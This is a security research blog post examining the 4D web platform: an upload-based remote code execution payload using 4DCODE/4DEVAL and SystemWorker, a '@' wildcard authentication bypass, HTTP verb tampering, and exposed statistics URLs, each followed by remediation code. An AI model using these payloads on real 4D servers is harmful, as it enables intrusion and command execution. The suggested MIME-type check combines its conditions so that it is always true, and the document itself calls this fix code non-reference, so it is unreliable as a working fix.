---
title: 4D Attack Surface — Part 2
published: 2024-12-31
description: A study of an unknown technology
tags:
  - research
  - web
  - injection
image: /images/4dattacksurface_part2/4dlogo.png
category: Research
draft: false
---

## Summary
- [A bit of Context](#a-bit-of-context)
- [Filter Bypass Using Wildcard](#filter-bypass-using-wildcard)
- [HTTP Verb Tampering](#http-verb-tampering)
- [Information Disclosure Using 4D Builtins URL](#information-disclosure-using-4d-builtins-url)
- [Conclusion](#conclusion)

---

# A bit of Context
4D is a French company founded in 1984 that offers a whole range of tools for the development of professional applications. These applications
cover everything from **web servers** and **relational databases** to **thick clients**.

With [Kenji Endo](https://hacknshare.com/), we were able to observe that this technology was not widely used (around 6.000 results on Shodan).
In this sense, its unexplored attack surface represents an interesting field of study.

The first part of this series can be found here : https://hacknshare.com/posts/4d-attack-surface-part-1/. It covers how to start with 4D, secure development practices and template
injection vulnerabilities.

This part will cover :
- Code injection via insecure file upload functionality
- Filter bypass using wildcard
- Verb Tampering attacks
- Information disclosure using 4D builtins URL
- A final word on this technology and many others that deserve a closer look.

---

# Insecure File Upload Functionalities
A fairly common vulnerability encountered on web applications is the lack of verification in a file upload functionality.

- In the case of an application using PHP, it would be possible to exploit this flaw by uploading a PHP file and use it (if its path is known and reachable) to execute commands on the victim system.
- On the other hand, it is possible that an application doesn't directly use the files that store its back-end code. For example, with a python application, uploading a file containing python code (normally) won't help us.

## 4D payload engineering
From what we've been able to test and read in the vendor's documentation, 4D doesn't use its server-side files "directly" (as PHP does). However, it seems
possible to use an **html** file that contains tags : https://developer.4d.com/docs/WebServer/templates.
More precisely, it is possible to **FORCE** the interpretation of these tags with a precise extension, : **SHTML**.

From what we could see in the first part of this adventure, interpreting arbitrary 4D tags can lead to remote code execution. More precisely,
we are going to use the combination of the `4DCODE`/`4DEVAL` tags, which can execute 4D server-side code, and the
[SystemWorker](https://developer.4d.com/docs/API/SystemWorkerClass) class, which can execute system commands
on the remote target.

:::note
There are other alternatives to the [SystemWorker](https://developer.4d.com/docs/API/SystemWorkerClass) class, like the
[LAUNCH EXTERNAL PROCESS](https://doc.4d.com/4Dv18/4D/18.4/LAUNCH-EXTERNAL-PROCESS.301-5233035.en.html) Primitive.
:::

For a specific command on a windows remote host, our payload will look like this
```
<!--#4DCODE
var $worker:4D.SystemWorker
var $result:Text
$worker:=4D.SystemWorker.new("<COMMAND>")
$result:=$worker.wait().response
-->
<!--#4DTEXT $result-->
```

Because we love when payloads are short, we can imagine a one liner using `4DEVAL`, which will display the content directly.
```
<!--#4DEVAL 4D.SystemWorker.new("<COMMAND>").wait().response -->
```

:::note
As the uploaded file displays the result of the executed command, the further exploitation of the machine can be done using
either a webshell or a reverse shell.
:::

## Let's Test it !
In order to build the functionnality that will receive the uploaded file, we can use the
[WEB GET BODY PART](https://doc.4d.com/4Dv18/4D/18.4/WEB-GET-BODY-PART.301-5232846.fe.html) primitive. This function
is recovering all the informations stored in the HTML's request body (parameter, name, file, filename, ...) into arrays.

The example shown in the vendor's documentation (a bit modified) describe how to receive a file after a POST request but 
lacks verification on the uploaded content. First, we can see that the there is no control on various aspects in the code,
including the **destination** and the **extension** of the file

```
C_TEXT($vPartName;$vPartMimeType;$vPartFileName;$vDestinationFolder)
C_BLOB($vPartContentBlob)
C_LONGINT($i)
$vDestinationFolder:="./uploads/"

For($i;1;WEB GET BODY PART COUNT)
	WEB GET BODY PART($i;$vPartContentBlob;$vPartName;$vPartMimeType;$vPartFileName)
	If($vPartFileName#"")
		BLOB TO DOCUMENT($vDestinationFolder+$vPartFileName;$vPartContentBlob)
    End if
End for
WEB SEND HTTP REDIRECT("/")
```

The `C_<type>` primitives are assigning a type to one or more variables at the same time.

:::note
The code above can be use as a [4D Method](https://developer.4d.com/docs/fr/20/Concepts/methods), which can be reachable on the
website using the `/4DAction/<Method>` path.

Don’t forget to enable the processing of transformation tags by accessing the method’s properties and selecting “Available through 4D HTML tags and URLs (4DACTION…)”.
:::

Let's now upload our payload (modified to contain the `whoami` command) and jump on it since we know it is in the `/uploads/` directory !

![rce_proof](/images/4dattacksurface_part2/rce.jpg)

![honest_work](/images/4dattacksurface_part2/honest_work.jpg)

As an attacker, this type of exploitation is quite interesting, as it allows us to destroy the file after the exploitation phase,
and thus erase (part of) the payload traces.

## General remediation
Although the exploit is specific to 4D technology, the vulnerability exploited is rather “common”. When we want a user to send a
file to the website, we need to check several things to make sure they can't do nothing wrong :
- **Extension :** whitelist rather than blacklist
- **Content :** if possible, check magic bytes, MIME type and/or file structure using appropriate libraries (not necessarily the case for 4D)
- **Destination :** in order to avoid Path Traversal vulnerabilities, check that the file's destination path is not controllable in any way by the user (in particular by the filename supplied)

## 4D Specific remediation
Using the 4D code seen above, we will try to patch the vulnerability with a few additional checks :
- **Extension :** this is a gallery application, it would be wise to whitelist the `.png` and `.jpg` extensions
- **Content :** Additionally, we'll check the MIME type of the files (always `image/png` or `image/jpg`).
- **Destination :** we should remove folder separators ('/' for linux, '\\' for windows) present in the filename or at least identify them as bad characters.

```
C_TEXT($param; $mimetype; $filename; $extension)
C_BLOB($file_content)
C_LONGINT($i)

For ($i; 1; WEB Get body part count)
	WEB GET BODY PART($i; $file_content; $param; $mimetype; $filename)
	If ($filename#"")
		// MIME type verification
		If (($mimetype#"image/png") | ($mimetype#"image/jpeg"))
			WEB SEND HTTP REDIRECT("/error.html?message=badmime")
		end if
		// Bad character verification
		If (($filename%"/") | ($filename%"\\"))
			WEB SEND HTTP REDIRECT("/error.html?message=badchar")
		End if
		// Extension verification
		$extension:=File(Temporary folder+$filename; fk platform path).extension
		If (($extension#".jpg") & ($extension#".png"))
			WEB SEND HTTP REDIRECT("/error.html?message=invtype")
		End if 
		WEB SEND TEXT("IMAGE IT IS !!!")
		...
	End if 
End for 
```

:::note
We use the `File` class to analyse the file path and easily extract the extension (the last string beginning with a dot in the string).
:::

:::warning
The code presented here is not intended to be a reference, but rather a suggestion for improvements to the code in the documentation.
:::

## References
https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload

---

# Filter bypass using wildcard
4D allows all kinds of operations on strings as we can see in the [String](https://developer.4d.com/docs/Concepts/string) page in
the vendor's documentation.

One feature in particular caught our eye : The wildcard character '@'.

Indeed, if at a moment a character `@` is present in a string, it will act as a wildcard.

For example :
```
"ILoveCheeseBurger"="ilovecheeseburger" -> True
"ilovecheeseBurger"="ilovecheese" -> False
"ilovecheeseBurger"="ilovecheese@" -> True
"ilovecheeseBurger"="@" -> True
```

This feature can represent a threat as it can be used to bypass any string comparison or even authentication for example.

## Example of bad practice

Consider the code below :
```
If "ThisPasswordIsSoStrong"=$value
	ACCESS GRANTED...
End if
```

if the variable `$value` is received by an HTTP request and is equal to '@' instead of the intended password, the comparison will return "true". 

## Remediation
we can consider a few types of remediations for this flaw :
- Specifically for **passwords**, the best recommendation would not to compare them un-hashed.
- For a more general case, it would be advisable to refuse all user input containing the character '@'. We can take as an examplethe code in the following page :
	- [On-Web-Authentication-database-method](https://doc.4d.com/4Dv20/4D/20.6/On-Web-Authentication-database-method.301-7487969.fe.html)

---

# HTTP Verb Tampering
As we saw in the file upload section, it's possible to call 4D methods with HTTP requests (using for example the `/4DAction` path).

We noticed that 4D was quite permissive in terms of the method (GET/POST/PUT/...) used in the request, as long as the expected parameters were present.

https://doc.4d.com/4Dv18/4D/18.4/WEB-GET-HTTP-HEADER.301-5232839.en.html

For example, consider the following code :
```
ARRAY TEXT($names; 0)
ARRAY TEXT($values; 0)
WEB GET VARIABLES($names; $values)

$json:=New object
For ($i; 1; Size of array($names))
	$json[$names{$i}]:=$values{$i}
End for 

WEB SEND TEXT(JSON Stringify($json; *); "application/json")
```

What this code do :
- Allocating two arrays in order to store names and values of the HTTP HEADERS
- Puting the HTTP HEADERS into the arrays using the `WEB GET VARIABLES` primitive
- Creating a dictionary (key -> value) using the two arrays
- Returning the dictionary as a JSON (the content type is set to "application/json")

Now, consider the two HTTP requests below ;
```http
GET /4DACTION/Test?param1=value1&param2=value2 HTTP/1.1
Host: localhost
```
```http
POST /4DACTION/Test HTTP/1.1
Host: localhost

param1=value1&param2=value2
```

Due to the lack of verification of the method used, the result of both requests will be  : `{"param1": "value1","param2": "value2"}`

:::caution
The primitive `WEB GET VARIABLES` will take the parameters in the request body or in the URL (depending on the method used).
:::

This means we can use either GET, POST or another method ! The risk here is that an attacker could take advantage of this flaw to skip
authentication specific to an HTTP method.

## How to filter on the HTTP method
In the code below, we wanted to filter and select only the requests that used the GET method. We thus used the primitive `WEB GET HTTP HEADER`
primitive to get the headers and the method name.
```
ARRAY TEXT($names; 0)
ARRAY TEXT($values; 0)
ARRAY TEXT($hnames; 0)
ARRAY TEXT($hvalues; 0)

WEB GET VARIABLES($names; $values)
WEB GET HTTP HEADER($hnames; $hvalues)

C_LONGINT($ind_method)
$ind_method:=Find in array($hnames; "X-METHOD")

If $hvalues{$ind_method}="GET"
	WEB SEND TEXT("GET Method it is ! :)")
Else 
	WEB SEND HTTP REDIRECT("/error.html?message=invmeth")
End If
```

:::warning
The code presented here is not intended to be a reference, but rather a suggestion for improvements to the code in the documentation.
:::

---

# Information Disclosure Using 4D Builtins URL

4D Server, like all full-stack engines, gathers statistics and caches data for optimization purposes.
This data can be accessed both locally on the machine and remotely via several endpoints.

We found that these endpoints can provide data on the site's pages and structure. It could help an attacker
to refine his attacks on private sections of a server, for example, whose path would be too difficult to guess
with fuzzing.
- `4DSTATS` and `4DHTMLSTATS` show pages stored in the website cache. That can represent any file previously loaded by a user (HTML, image, pdf, etc.) 
- `4DCACHECLEAR` resets the website cache. We assume this cannot have a strong impact on the application, although it can make it a little slower if called too often during busy periods. 
- `4DWEBTEST` sends back to us our IP address, user-agent, the date and the used version of 4D.

For example, the `/4DSTATS` URL look like this :
![4dstats](/images/4dattacksurface_part2/4dstats.png)

As we can see, the most dangerous ones can be `4DSTATS` and `4DHTMLSTATS` as they are leaking application files paths.

:::note
Documentation for these endpoints can be found on this [documentation page](https://doc.4d.com/4Dv18/4D/18.4/URLs-and-Form-Actions.300-5232844.en.html)
:::

Finally, only the [French section of the documentation](https://doc.4d.com/4Dv18/4D/18.4/Informations-sur-le-site-Web.300-5232828.fr.html) specifies
that access to these URLs is reserved for the administrator and superuser. Despite this, we noticed that we could access all the 3 URLs of
our 4D test instance from several public IPs without restriction. We concluded that access was not restricted by default.

## Remediation

One of the most easy way to patch URL access from the public is to enable HTTP Auehthentication on specific URL. An implementation of HTTP Authentication is
publicly available on [4D's documentation](https://doc.4d.com/4Dv20/4D/20.6/On-Web-Authentication-database-method.301-7487969.fe.html)

---

# Conclusion

4D is a technology used by far too many servers to be ignored from a security point of view.

No vulnerabilities were found during this study of 4D technology, but many pitfalls could be encountered
by unsuspecting developers. The most pertinent remedy might therefore be to make all developers on this
platform aware of the issues addressed in this suite.

As we have seen, 4D's attack surface is wide and just waiting to be explored, like that of many
little-known technologies. So we'd be happy to motivate initiatives like ours to come to fruition
on other technologies.

Thanks.